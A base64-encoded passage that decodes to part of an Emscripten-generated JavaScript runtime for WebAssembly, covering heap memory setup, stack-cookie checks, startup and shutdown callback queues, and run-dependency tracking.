IGFycmF5KScpDQogIEhFQVA4LnNldChhcnJheSwgYnVmZmVyKTsNCn0NCg0KLyoqIEBwYXJhbSB7Ym9vbGVhbj19IGRvbnRBZGROdWxsICovDQpmdW5jdGlvbiB3cml0ZUFzY2lpVG9NZW1vcnkoc3RyLCBidWZmZXIsIGRvbnRBZGROdWxsKSB7DQogIGZvciAodmFyIGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgKytpKSB7DQogICAgYXNzZXJ0KHN0ci5jaGFyQ29kZUF0KGkpID09PSBzdHIuY2hhckNvZGVBdChpKSYweGZmKTsNCiAgICBIRUFQOFsoKGJ1ZmZlcisrKT4+MCldPXN0ci5jaGFyQ29kZUF0KGkpOw0KICB9DQogIC8vIE51bGwtdGVybWluYXRlIHRoZSBwb2ludGVyIHRvIHRoZSBIRUFQLg0KICBpZiAoIWRvbnRBZGROdWxsKSBIRUFQOFsoKGJ1ZmZlcik+PjApXT0wOw0KfQ0KDQoNCg0KLy8gTWVtb3J5IG1hbmFnZW1lbnQNCg0KdmFyIFBBR0VfU0laRSA9IDE2Mzg0Ow0KdmFyIFdBU01fUEFHRV9TSVpFID0gNjU1MzY7DQp2YXIgQVNNSlNfUEFHRV9TSVpFID0gMTY3NzcyMTY7DQoNCmZ1bmN0aW9uIGFsaWduVXAoeCwgbXVsdGlwbGUpIHsNCiAgaWYgKHggJSBtdWx0aXBsZSA+IDApIHsNCiAgICB4ICs9IG11bHRpcGxlIC0gKHggJSBtdWx0aXBsZSk7DQogIH0NCiAgcmV0dXJuIHg7DQp9DQoNCnZhciBIRUFQLA0KLyoqIEB0eXBlIHtBcnJheUJ1ZmZlcn0gKi8NCiAgYnVmZmVyLA0KLyoqIEB0eXBlIHtJbnQ4QXJyYXl9ICovDQogIEhFQVA4LA0KLyoqIEB0eXBlIHtVaW50OEFycmF5fSAqLw0KICBIRUFQVTgsDQovKiogQHR5cGUge0ludDE2QXJyYXl9ICovDQogIEhFQVAxNiwNCi8qKiBAdHlwZSB7VWludDE2QXJyYXl9ICovDQogIEhFQVBVMTYsDQovKiogQHR5cGUge0ludDMyQXJyYXl9ICovDQogIEhFQVAzMiwNCi8qKiBAdHlwZSB7VWludDMyQXJyYXl9ICovDQogIEhFQVBVMzIsDQovKiogQHR5cGUge0Zsb2F0MzJBcnJheX0gKi8NCiAgSEVBUEYzMiwNCi8qKiBAdHlwZSB7RmxvYXQ2NEFycmF5fSAqLw0KICBIRUFQRjY0Ow0KDQpmdW5jdGlvbiB1cGRhdGVHbG9iYWxCdWZmZXJBbmRWaWV3cyhidWYpIHsNCiAgYnVmZmVyID0gYnVmOw0KICBNb2R1bGVbJ0hFQVA4J10gPSBIRUFQOCA9IG5ldyBJbnQ4QXJyYXkoYnVmKTsNCiAgTW9kdWxlWydIRUFQMTYnXSA9IEhFQVAxNiA9IG5ldyBJbnQxNkFycmF5KGJ1Zik7DQogIE1vZHVsZVsnSEVBUDMyJ10gPSBIRUFQMzIgPSBuZXcgSW50MzJBcnJheShidWYpOw0KICBNb2R1bGVbJ0hFQVBVOCddID0gSEVBUFU4ID0gbmV3IFVpbnQ4QXJyYXkoYnVmKTsNCiAgTW9kdWxlWydIRUFQVTE2J10gPSBIRUFQVTE2ID0gbmV3IFVpbnQxNkFycmF5KGJ1Zik7DQogIE1vZHVsZVsnSEVBUFUzMiddID0gSEVBUFUzMiA9IG5ldyBVaW50MzJBcnJheShidWYpOw0KICBNb2R1bGVbJ0hFQVBGMzInXSA9IEhFQVBGMzIgPSBuZXcgRmxvYXQzMkFycmF5KGJ1Zik7DQogIE1vZHVsZVsnSEVBUEY2NCddID0gSEVBUEY2NCA9IG5ldyBGbG9hdDY0QXJyYXkoYnVmKTsNCn0NCg0KdmFyIFNUQVRJQ19CQVNFID0gMTAyNCwNCiAgICBTVEFDS19CQVNFID0gNTI2NDU3NiwNCiAgICBTVEFDS1RPUCA9IFNUQUNLX0JBU0UsDQogICAgU1RBQ0tfTUFYID0gMjE2OTYsDQogICAgRFlOQU1JQ19CQVNFID0gNTI2NDU3NiwNCiAgICBEWU5BTUlDVE9QX1BUUiA9IDIxNTM2Ow0KDQphc3NlcnQoU1RBQ0tfQkFTRSAlIDE2ID09PSAwLCAnc3RhY2sgbXVzdCBzdGFydCBhbGlnbmVkJyk7DQphc3NlcnQoRFlOQU1JQ19CQVNFICUgMTYgPT09IDAsICdoZWFwIG11c3Qgc3RhcnQgYWxpZ25lZCcpOw0KDQoNCnZhciBUT1RBTF9TVEFDSyA9IDUyNDI4ODA7DQppZiAoTW9kdWxlWydUT1RBTF9TVEFDSyddKSBhc3NlcnQoVE9UQUxfU1RBQ0sgPT09IE1vZHVsZVsnVE9UQUxfU1RBQ0snXSwgJ3RoZSBzdGFjayBzaXplIGNhbiBubyBsb25nZXIgYmUgZGV0ZXJtaW5lZCBhdCBydW50aW1lJykNCg0KdmFyIElOSVRJQUxfSU5JVElBTF9NRU1PUlkgPSBNb2R1bGVbJ0lOSVRJQUxfTUVNT1JZJ10gfHwgMTY3NzcyMTY7aWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgJ0lOSVRJQUxfTUVNT1JZJykpIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShNb2R1bGUsICdJTklUSUFMX01FTU9SWScsIHsgY29uZmlndXJhYmxlOiB0cnVlLCBnZXQ6IGZ1bmN0aW9uKCkgeyBhYm9ydCgnTW9kdWxlLklOSVRJQUxfTUVNT1JZIGhhcyBiZWVuIHJlcGxhY2VkIHdpdGggcGxhaW4gSU5JVElBTF9JTklUSUFMX01FTU9SWSAodGhlIGluaXRpYWwgdmFsdWUgY2FuIGJlIHByb3ZpZGVkIG9uIE1vZHVsZSwgYnV0IGFmdGVyIHN0YXJ0dXAgdGhlIHZhbHVlIGlzIG9ubHkgbG9va2VkIGZvciBvbiBhIGxvY2FsIHZhcmlhYmxlIG9mIHRoYXQgbmFtZSknKSB9IH0pOw0KDQphc3NlcnQoSU5JVElBTF9JTklUSUFMX01FTU9SWSA+PSBUT1RBTF9TVEFDSywgJ0lOSVRJQUxfTUVNT1JZIHNob3VsZCBiZSBsYXJnZXIgdGhhbiBUT1RBTF9TVEFDSywgd2FzICcgKyBJTklUSUFMX0lOSVRJQUxfTUVNT1JZICsgJyEgKFRPVEFMX1NUQUNLPScgKyBUT1RBTF9TVEFDSyArICcpJyk7DQoNCi8vIGNoZWNrIGZvciBmdWxsIGVuZ2luZSBzdXBwb3J0ICh1c2Ugc3RyaW5nICdzdWJhcnJheScgdG8gYXZvaWQgY2xvc3VyZSBjb21waWxlciBjb25mdXNpb24pDQphc3NlcnQodHlwZW9mIEludDMyQXJyYXkgIT09ICd1bmRlZmluZWQnICYmIHR5cGVvZiBGbG9hdDY0QXJyYXkgIT09ICd1bmRlZmluZWQnICYmIEludDMyQXJyYXkucHJvdG90eXBlLnN1YmFycmF5ICE9PSB1bmRlZmluZWQgJiYgSW50MzJBcnJheS5wcm90b3R5cGUuc2V0ICE9PSB1bmRlZmluZWQsDQogICAgICAgJ0pTIGVuZ2luZSBkb2VzIG5vdCBwcm92aWRlIGZ1bGwgdHlwZWQgYXJyYXkgc3VwcG9ydCcpOw0KDQoNCg0KDQoNCg0KDQoNCi8vIEluIG5vbi1zdGFuZGFsb25lL25vcm1hbCBtb2RlLCB3ZSBjcmVhdGUgdGhlIG1lbW9yeSBoZXJlLg0KDQoNCg0KLy8gQ3JlYXRlIHRoZSBtYWluIG1lbW9yeS4gKE5vdGU6IHRoaXMgaXNuJ3QgdXNlZCBpbiBTVEFOREFMT05FX1dBU00gbW9kZSBzaW5jZSB0aGUgd2FzbQ0KLy8gbWVtb3J5IGlzIGNyZWF0ZWQgaW4gdGhlIHdhc20sIG5vdCBpbiBKUy4pDQoNCiAgaWYgKE1vZHVsZVsnd2FzbU1lbW9yeSddKSB7DQogICAgd2FzbU1lbW9yeSA9IE1vZHVsZVsnd2FzbU1lbW9yeSddOw0KICB9IGVsc2UNCiAgew0KICAgIHdhc21NZW1vcnkgPSBuZXcgV2ViQXNzZW1ibHkuTWVtb3J5KHsNCiAgICAgICdpbml0aWFsJzogSU5JVElBTF9JTklUSUFMX01FTU9SWSAvIFdBU01fUEFHRV9TSVpFDQogICAgICAsDQogICAgICAnbWF4aW11bSc6IElOSVRJQUxfSU5JVElBTF9NRU1PUlkgLyBXQVNNX1BBR0VfU0laRQ0KICAgIH0pOw0KICB9DQoNCg0KaWYgKHdhc21NZW1vcnkpIHsNCiAgYnVmZmVyID0gd2FzbU1lbW9yeS5idWZmZXI7DQp9DQoNCi8vIElmIHRoZSB1c2VyIHByb3ZpZGVzIGFuIGluY29ycmVjdCBsZW5ndGgsIGp1c3QgdXNlIHRoYXQgbGVuZ3RoIGluc3RlYWQgcmF0aGVyIHRoYW4gcHJvdmlkaW5nIHRoZSB1c2VyIHRvDQovLyBzcGVjaWZpY2FsbHkgcHJvdmlkZSB0aGUgbWVtb3J5IGxlbmd0aCB3aXRoIE1vZHVsZVsnSU5JVElBTF9NRU1PUlknXS4NCklOSVRJQUxfSU5JVElBTF9NRU1PUlkgPSBidWZmZXIuYnl0ZUxlbmd0aDsNCmFzc2VydChJTklUSUFMX0lOSVRJQUxfTUVNT1JZICUgV0FTTV9QQUdFX1NJWkUgPT09IDApOw0KdXBkYXRlR2xvYmFsQnVmZmVyQW5kVmlld3MoYnVmZmVyKTsNCg0KSEVBUDMyW0RZTkFNSUNUT1BfUFRSPj4yXSA9IERZTkFNSUNfQkFTRTsNCg0KDQoNCg0KDQoNCi8vIEluaXRpYWxpemVzIHRoZSBzdGFjayBjb29raWUuIENhbGxlZCBhdCB0aGUgc3RhcnR1cCBvZiBtYWluIGFuZCBhdCB0aGUgc3RhcnR1cCBvZiBlYWNoIHRocmVhZCBpbiBwdGhyZWFkcyBtb2RlLg0KZnVuY3Rpb24gd3JpdGVTdGFja0Nvb2tpZSgpIHsNCiAgYXNzZXJ0KChTVEFDS19NQVggJiAzKSA9PSAwKTsNCiAgLy8gVGhlIHN0YWNrIGdyb3dzIGRvd253YXJkcw0KICBIRUFQVTMyWyhTVEFDS19NQVggPj4gMikrMV0gPSAweDIxMzU0Njc7DQogIEhFQVBVMzJbKFNUQUNLX01BWCA+PiAyKSsyXSA9IDB4ODlCQUNERkU7DQogIC8vIEFsc28gdGVzdCB0aGUgZ2xvYmFsIGFkZHJlc3MgMCBmb3IgaW50ZWdyaXR5Lg0KICAvLyBXZSBkb24ndCBkbyB0aGlzIHdpdGggQVNhbiBiZWNhdXNlIEFTYW4gZG9lcyBpdHMgb3duIGNoZWNrcyBmb3IgdGhpcy4NCiAgSEVBUDMyWzBdID0gMHg2MzczNmQ2NTsgLyogJ2Vtc2MnICovDQp9DQoNCmZ1bmN0aW9uIGNoZWNrU3RhY2tDb29raWUoKSB7DQogIHZhciBjb29raWUxID0gSEVBUFUzMlsoU1RBQ0tfTUFYID4+IDIpKzFdOw0KICB2YXIgY29va2llMiA9IEhFQVBVMzJbKFNUQUNLX01BWCA+PiAyKSsyXTsNCiAgaWYgKGNvb2tpZTEgIT0gMHgyMTM1NDY3IHx8IGNvb2tpZTIgIT0gMHg4OUJBQ0RGRSkgew0KICAgIGFib3J0KCdTdGFjayBvdmVyZmxvdyEgU3RhY2sgY29va2llIGhhcyBiZWVuIG92ZXJ3cml0dGVuLCBleHBlY3RlZCBoZXggZHdvcmRzIDB4ODlCQUNERkUgYW5kIDB4MjEzNTQ2NywgYnV0IHJlY2VpdmVkIDB4JyArIGNvb2tpZTIudG9TdHJpbmcoMTYpICsgJyAnICsgY29va2llMS50b1N0cmluZygxNikpOw0KICB9DQogIC8vIEFsc28gdGVzdCB0aGUgZ2xvYmFsIGFkZHJlc3MgMCBmb3IgaW50ZWdyaXR5Lg0KICAvLyBXZSBkb24ndCBkbyB0aGlzIHdpdGggQVNhbiBiZWNhdXNlIEFTYW4gZG9lcyBpdHMgb3duIGNoZWNrcyBmb3IgdGhpcy4NCiAgaWYgKEhFQVAzMlswXSAhPT0gMHg2MzczNmQ2NSAvKiAnZW1zYycgKi8pIGFib3J0KCdSdW50aW1lIGVycm9yOiBUaGUgYXBwbGljYXRpb24gaGFzIGNvcnJ1cHRlZCBpdHMgaGVhcCBtZW1vcnkgYXJlYSAoYWRkcmVzcyB6ZXJvKSEnKTsNCn0NCg0KDQoNCg0KDQovLyBFbmRpYW5uZXNzIGNoZWNrIChub3RlOiBhc3N1bWVzIGNvbXBpbGVyIGFyY2ggd2FzIGxpdHRsZS1lbmRpYW4pDQooZnVuY3Rpb24oKSB7DQogIHZhciBoMTYgPSBuZXcgSW50MTZBcnJheSgxKTsNCiAgdmFyIGg4ID0gbmV3IEludDhBcnJheShoMTYuYnVmZmVyKTsNCiAgaDE2WzBdID0gMHg2MzczOw0KICBpZiAoaDhbMF0gIT09IDB4NzMgfHwgaDhbMV0gIT09IDB4NjMpIHRocm93ICdSdW50aW1lIGVycm9yOiBleHBlY3RlZCB0aGUgc3lzdGVtIHRvIGJlIGxpdHRsZS1lbmRpYW4hJzsNCn0pKCk7DQoNCmZ1bmN0aW9uIGFib3J0Rm5QdHJFcnJvcihwdHIsIHNpZykgew0KCWFib3J0KCJJbnZhbGlkIGZ1bmN0aW9uIHBvaW50ZXIgIiArIHB0ciArICIgY2FsbGVkIHdpdGggc2lnbmF0dXJlICciICsgc2lnICsgIicuIFBlcmhhcHMgdGhpcyBpcyBhbiBpbnZhbGlkIHZhbHVlIChlLmcuIGNhdXNlZCBieSBjYWxsaW5nIGEgdmlydHVhbCBtZXRob2Qgb24gYSBOVUxMIHBvaW50ZXIpPyBPciBjYWxsaW5nIGEgZnVuY3Rpb24gd2l0aCBhbiBpbmNvcnJlY3QgdHlwZSwgd2hpY2ggd2lsbCBmYWlsPyAoaXQgaXMgd29ydGggYnVpbGRpbmcgeW91ciBzb3VyY2UgZmlsZXMgd2l0aCAtV2Vycm9yICh3YXJuaW5ncyBhcmUgZXJyb3JzKSwgYXMgd2FybmluZ3MgY2FuIGluZGljYXRlIHVuZGVmaW5lZCBiZWhhdmlvciB3aGljaCBjYW4gY2F1c2UgdGhpcykuIEJ1aWxkIHdpdGggQVNTRVJUSU9OUz0yIGZvciBtb3JlIGluZm8uIik7DQp9DQoNCg0KDQpmdW5jdGlvbiBjYWxsUnVudGltZUNhbGxiYWNrcyhjYWxsYmFja3MpIHsNCiAgd2hpbGUoY2FsbGJhY2tzLmxlbmd0aCA+IDApIHsNCiAgICB2YXIgY2FsbGJhY2sgPSBjYWxsYmFja3Muc2hpZnQoKTsNCiAgICBpZiAodHlwZW9mIGNhbGxiYWNrID09ICdmdW5jdGlvbicpIHsNCiAgICAgIGNhbGxiYWNrKE1vZHVsZSk7IC8vIFBhc3MgdGhlIG1vZHVsZSBhcyB0aGUgZmlyc3QgYXJndW1lbnQuDQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgdmFyIGZ1bmMgPSBjYWxsYmFjay5mdW5jOw0KICAgIGlmICh0eXBlb2YgZnVuYyA9PT0gJ251bWJlcicpIHsNCiAgICAgIGlmIChjYWxsYmFjay5hcmcgPT09IHVuZGVmaW5lZCkgew0KICAgICAgICBNb2R1bGVbJ2R5bkNhbGxfdiddKGZ1bmMpOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgTW9kdWxlWydkeW5DYWxsX3ZpJ10oZnVuYywgY2FsbGJhY2suYXJnKTsNCiAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgZnVuYyhjYWxsYmFjay5hcmcgPT09IHVuZGVmaW5lZCA/IG51bGwgOiBjYWxsYmFjay5hcmcpOw0KICAgIH0NCiAgfQ0KfQ0KDQp2YXIgX19BVFBSRVJVTl9fICA9IFtdOyAvLyBmdW5jdGlvbnMgY2FsbGVkIGJlZm9yZSB0aGUgcnVudGltZSBpcyBpbml0aWFsaXplZA0KdmFyIF9fQVRJTklUX18gICAgPSBbXTsgLy8gZnVuY3Rpb25zIGNhbGxlZCBkdXJpbmcgc3RhcnR1cA0KdmFyIF9fQVRNQUlOX18gICAgPSBbXTsgLy8gZnVuY3Rpb25zIGNhbGxlZCB3aGVuIG1haW4oKSBpcyB0byBiZSBydW4NCnZhciBfX0FURVhJVF9fICAgID0gW107IC8vIGZ1bmN0aW9ucyBjYWxsZWQgZHVyaW5nIHNodXRkb3duDQp2YXIgX19BVFBPU1RSVU5fXyA9IFtdOyAvLyBmdW5jdGlvbnMgY2FsbGVkIGFmdGVyIHRoZSBtYWluKCkgaXMgY2FsbGVkDQoNCnZhciBydW50aW1lSW5pdGlhbGl6ZWQgPSBmYWxzZTsNCnZhciBydW50aW1lRXhpdGVkID0gZmFsc2U7DQoNCg0KZnVuY3Rpb24gcHJlUnVuKCkgew0KDQogIGlmIChNb2R1bGVbJ3ByZVJ1biddKSB7DQogICAgaWYgKHR5cGVvZiBNb2R1bGVbJ3ByZVJ1biddID09ICdmdW5jdGlvbicpIE1vZHVsZVsncHJlUnVuJ10gPSBbTW9kdWxlWydwcmVSdW4nXV07DQogICAgd2hpbGUgKE1vZHVsZVsncHJlUnVuJ10ubGVuZ3RoKSB7DQogICAgICBhZGRPblByZVJ1bihNb2R1bGVbJ3ByZVJ1biddLnNoaWZ0KCkpOw0KICAgIH0NCiAgfQ0KDQogIGNhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRQUkVSVU5fXyk7DQp9DQoNCmZ1bmN0aW9uIGluaXRSdW50aW1lKCkgew0KICBjaGVja1N0YWNrQ29va2llKCk7DQogIGFzc2VydCghcnVudGltZUluaXRpYWxpemVkKTsNCiAgcnVudGltZUluaXRpYWxpemVkID0gdHJ1ZTsNCiAgaWYgKCFNb2R1bGVbIm5vRlNJbml0Il0gJiYgIUZTLmluaXQuaW5pdGlhbGl6ZWQpIEZTLmluaXQoKTsNClRUWS5pbml0KCk7DQogIGNhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRJTklUX18pOw0KfQ0KDQpmdW5jdGlvbiBwcmVNYWluKCkgew0KICBjaGVja1N0YWNrQ29va2llKCk7DQogIEZTLmlnbm9yZVBlcm1pc3Npb25zID0gZmFsc2U7DQogIGNhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRNQUlOX18pOw0KfQ0KDQpmdW5jdGlvbiBleGl0UnVudGltZSgpIHsNCiAgY2hlY2tTdGFja0Nvb2tpZSgpOw0KICBydW50aW1lRXhpdGVkID0gdHJ1ZTsNCn0NCg0KZnVuY3Rpb24gcG9zdFJ1bigpIHsNCiAgY2hlY2tTdGFja0Nvb2tpZSgpOw0KDQogIGlmIChNb2R1bGVbJ3Bvc3RSdW4nXSkgew0KICAgIGlmICh0eXBlb2YgTW9kdWxlWydwb3N0UnVuJ10gPT0gJ2Z1bmN0aW9uJykgTW9kdWxlWydwb3N0UnVuJ10gPSBbTW9kdWxlWydwb3N0UnVuJ11dOw0KICAgIHdoaWxlIChNb2R1bGVbJ3Bvc3RSdW4nXS5sZW5ndGgpIHsNCiAgICAgIGFkZE9uUG9zdFJ1bihNb2R1bGVbJ3Bvc3RSdW4nXS5zaGlmdCgpKTsNCiAgICB9DQogIH0NCg0KICBjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUUE9TVFJVTl9fKTsNCn0NCg0KZnVuY3Rpb24gYWRkT25QcmVSdW4oY2IpIHsNCiAgX19BVFBSRVJVTl9fLnVuc2hpZnQoY2IpOw0KfQ0KDQpmdW5jdGlvbiBhZGRPbkluaXQoY2IpIHsNCiAgX19BVElOSVRfXy51bnNoaWZ0KGNiKTsNCn0NCg0KZnVuY3Rpb24gYWRkT25QcmVNYWluKGNiKSB7DQogIF9fQVRNQUlOX18udW5zaGlmdChjYik7DQp9DQoNCmZ1bmN0aW9uIGFkZE9uRXhpdChjYikgew0KfQ0KDQpmdW5jdGlvbiBhZGRPblBvc3RSdW4oY2IpIHsNCiAgX19BVFBPU1RSVU5fXy51bnNoaWZ0KGNiKTsNCn0NCg0KLyoqIEBwYXJhbSB7bnVtYmVyfGJvb2xlYW49fSBpZ25vcmUgKi8NCmZ1bmN0aW9uIHVuU2lnbih2YWx1ZSwgYml0cywgaWdub3JlKSB7DQogIGlmICh2YWx1ZSA+PSAwKSB7DQogICAgcmV0dXJuIHZhbHVlOw0KICB9DQogIHJldHVybiBiaXRzIDw9IDMyID8gMipNYXRoLmFicygxIDw8IChiaXRzLTEpKSArIHZhbHVlIC8vIE5lZWQgc29tZSB0cmlja2VyeSwgc2luY2UgaWYgYml0cyA9PSAzMiwgd2UgYXJlIHJpZ2h0IGF0IHRoZSBsaW1pdCBvZiB0aGUgYml0cyBKUyB1c2VzIGluIGJpdHNoaWZ0cw0KICAgICAgICAgICAgICAgICAgICA6IE1hdGgucG93KDIsIGJpdHMpICAgICAgICAgKyB2YWx1ZTsNCn0NCi8qKiBAcGFyYW0ge251bWJlcnxib29sZWFuPX0gaWdub3JlICovDQpmdW5jdGlvbiByZVNpZ24odmFsdWUsIGJpdHMsIGlnbm9yZSkgew0KICBpZiAodmFsdWUgPD0gMCkgew0KICAgIHJldHVybiB2YWx1ZTsNCiAgfQ0KICB2YXIgaGFsZiA9IGJpdHMgPD0gMzIgPyBNYXRoLmFicygxIDw8IChiaXRzLTEpKSAvLyBhYnMgaXMgbmVlZGVkIGlmIGJpdHMgPT0gMzINCiAgICAgICAgICAgICAgICAgICAgICAgIDogTWF0aC5wb3coMiwgYml0cy0xKTsNCiAgaWYgKHZhbHVlID49IGhhbGYgJiYgKGJpdHMgPD0gMzIgfHwgdmFsdWUgPiBoYWxmKSkgeyAvLyBmb3IgaHVnZSB2YWx1ZXMsIHdlIGNhbiBoaXQgdGhlIHByZWNpc2lvbiBsaW1pdCBhbmQgYWx3YXlzIGdldCB0cnVlIGhlcmUuIHNvIGRvbid0IGRvIHRoYXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBidXQsIGluIGdlbmVyYWwgdGhlcmUgaXMgbm8gcGVyZmVjdCBzb2x1dGlvbiBoZXJlLiBXaXRoIDY0LWJpdCBpbnRzLCB3ZSBnZXQgcm91bmRpbmcgYW5kIGVycm9ycw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IEluIGk2NCBtb2RlIDEsIHJlc2lnbiB0aGUgdHdvIHBhcnRzIHNlcGFyYXRlbHkgYW5kIHNhZmVseQ0KICAgIHZhbHVlID0gLTIqaGFsZiArIHZhbHVlOyAvLyBDYW5ub3QgYml0c2hpZnQgaGFsZiwgYXMgaXQgbWF5IGJlIGF0IHRoZSBsaW1pdCBvZiB0aGUgYml0cyBKUyB1c2VzIGluIGJpdHNoaWZ0cw0KICB9DQogIHJldHVybiB2YWx1ZTsNCn0NCg0KDQoNCg0KLy8gaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvTWF0aC9pbXVsDQoNCi8vIGh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvV2ViL0phdmFTY3JpcHQvUmVmZXJlbmNlL0dsb2JhbF9PYmplY3RzL01hdGgvZnJvdW5kDQoNCi8vIGh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvV2ViL0phdmFTY3JpcHQvUmVmZXJlbmNlL0dsb2JhbF9PYmplY3RzL01hdGgvY2x6MzINCg0KLy8gaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvTWF0aC90cnVuYw0KDQphc3NlcnQoTWF0aC5pbXVsLCAnVGhpcyBicm93c2VyIGRvZXMgbm90IHN1cHBvcnQgTWF0aC5pbXVsKCksIGJ1aWxkIHdpdGggTEVHQUNZX1ZNX1NVUFBPUlQgb3IgUE9MWUZJTExfT0xEX01BVEhfRlVOQ1RJT05TIHRvIGFkZCBpbiBhIHBvbHlmaWxsJyk7DQphc3NlcnQoTWF0aC5mcm91bmQsICdUaGlzIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCBNYXRoLmZyb3VuZCgpLCBidWlsZCB3aXRoIExFR0FDWV9WTV9TVVBQT1JUIG9yIFBPTFlGSUxMX09MRF9NQVRIX0ZVTkNUSU9OUyB0byBhZGQgaW4gYSBwb2x5ZmlsbCcpOw0KYXNzZXJ0KE1hdGguY2x6MzIsICdUaGlzIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCBNYXRoLmNsejMyKCksIGJ1aWxkIHdpdGggTEVHQUNZX1ZNX1NVUFBPUlQgb3IgUE9MWUZJTExfT0xEX01BVEhfRlVOQ1RJT05TIHRvIGFkZCBpbiBhIHBvbHlmaWxsJyk7DQphc3NlcnQoTWF0aC50cnVuYywgJ1RoaXMgYnJvd3NlciBkb2VzIG5vdCBzdXBwb3J0IE1hdGgudHJ1bmMoKSwgYnVpbGQgd2l0aCBMRUdBQ1lfVk1fU1VQUE9SVCBvciBQT0xZRklMTF9PTERfTUFUSF9GVU5DVElPTlMgdG8gYWRkIGluIGEgcG9seWZpbGwnKTsNCg0KdmFyIE1hdGhfYWJzID0gTWF0aC5hYnM7DQp2YXIgTWF0aF9jb3MgPSBNYXRoLmNvczsNCnZhciBNYXRoX3NpbiA9IE1hdGguc2luOw0KdmFyIE1hdGhfdGFuID0gTWF0aC50YW47DQp2YXIgTWF0aF9hY29zID0gTWF0aC5hY29zOw0KdmFyIE1hdGhfYXNpbiA9IE1hdGguYXNpbjsNCnZhciBNYXRoX2F0YW4gPSBNYXRoLmF0YW47DQp2YXIgTWF0aF9hdGFuMiA9IE1hdGguYXRhbjI7DQp2YXIgTWF0aF9leHAgPSBNYXRoLmV4cDsNCnZhciBNYXRoX2xvZyA9IE1hdGgubG9nOw0KdmFyIE1hdGhfc3FydCA9IE1hdGguc3FydDsNCnZhciBNYXRoX2NlaWwgPSBNYXRoLmNlaWw7DQp2YXIgTWF0aF9mbG9vciA9IE1hdGguZmxvb3I7DQp2YXIgTWF0aF9wb3cgPSBNYXRoLnBvdzsNCnZhciBNYXRoX2ltdWwgPSBNYXRoLmltdWw7DQp2YXIgTWF0aF9mcm91bmQgPSBNYXRoLmZyb3VuZDsNCnZhciBNYXRoX3JvdW5kID0gTWF0aC5yb3VuZDsNCnZhciBNYXRoX21pbiA9IE1hdGgubWluOw0KdmFyIE1hdGhfbWF4ID0gTWF0aC5tYXg7DQp2YXIgTWF0aF9jbHozMiA9IE1hdGguY2x6MzI7DQp2YXIgTWF0aF90cnVuYyA9IE1hdGgudHJ1bmM7DQoNCg0KDQovLyBBIGNvdW50ZXIgb2YgZGVwZW5kZW5jaWVzIGZvciBjYWxsaW5nIHJ1bigpLiBJZiB3ZSBuZWVkIHRvDQovLyBkbyBhc3luY2hyb25vdXMgd29yayBiZWZvcmUgcnVubmluZywgaW5jcmVtZW50IHRoaXMgYW5kDQovLyBkZWNyZW1lbnQgaXQuIEluY3JlbWVudGluZyBtdXN0IGhhcHBlbiBpbiBhIHBsYWNlIGxpa2UNCi8vIE1vZHVsZS5wcmVSdW4gKHVzZWQgYnkgZW1jYyB0byBhZGQgZmlsZSBwcmVsb2FkaW5nKS4NCi8vIE5vdGUgdGhhdCB5b3UgY2FuIGFkZCBkZXBlbmRlbmNpZXMgaW4gcHJlUnVuLCBldmVuIHRob3VnaA0KLy8gaXQgaGFwcGVucyByaWdodCBiZWZvcmUgcnVuIC0gcnVuIHdpbGwgYmUgcG9zdHBvbmVkIHVudGlsDQovLyB0aGUgZGVwZW5kZW5jaWVzIGFyZSBtZXQuDQp2YXIgcnVuRGVwZW5kZW5jaWVzID0gMDsNCnZhciBydW5EZXBlbmRlbmN5V2F0Y2hlciA9IG51bGw7DQp2YXIgZGVwZW5kZW5jaWVzRnVsZmlsbGVkID0gbnVsbDsgLy8gb3ZlcnJpZGRlbiB0byB0YWtlIGRpZmZlcmVudCBhY3Rpb25zIHdoZW4gYWxsIHJ1biBkZXBlbmRlbmNpZXMgYXJlIGZ1bGZpbGxlZA0KdmFyIHJ1bkRlcGVuZGVuY3lUcmFja2luZyA9IHt9Ow0KDQpmdW5jdGlvbiBnZXRVbmlxdWVSdW5EZXBlbmRlbmN5KGlkKSB7DQogIHZhciBvcmlnID0gaWQ7DQogIHdoaWxlICgxKSB7DQogICAgaWYgKCFydW5EZXBlbmRlbmN5VHJhY2tpbmdbaWRdKSByZXR1cm4gaWQ7DQogICAgaWQgPSBvcmlnICsgTWF0aC5yYW5kb20oKTsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBhZGRSdW5EZXBlbmRlbmN5KGlkKSB7DQogIHJ1bkRlcGVuZGVuY2llcysrOw0KDQogIGlmIChNb2R1bGVbJ21vbml0b3JSdW5EZXBlbmRlbmNpZXMnXSkgew0KICAgIE1vZHVsZVsnbW9uaXRvclJ1bkRlcGVuZGVuY2llcyddKHJ1bkRlcGVuZGVuY2llcyk7DQogIH0NCg0KICBpZiAoaWQpIHsNCiAgICBhc3NlcnQoIXJ1bkRlcGVuZGVuY3lUcmFja2luZ1tpZF0pOw0KICAgIHJ1bkRlcGVuZGVuY3lUcmFja2luZ1tpZF0gPSAxOw0KICAgIGlmIChydW5EZXBlbmRlbmN5V2F0Y2hlciA9PT0gbnVsbCAmJiB0eXBlb2Ygc2V0SW50ZXJ2YWwgIT09ICd1bmRlZmluZWQnK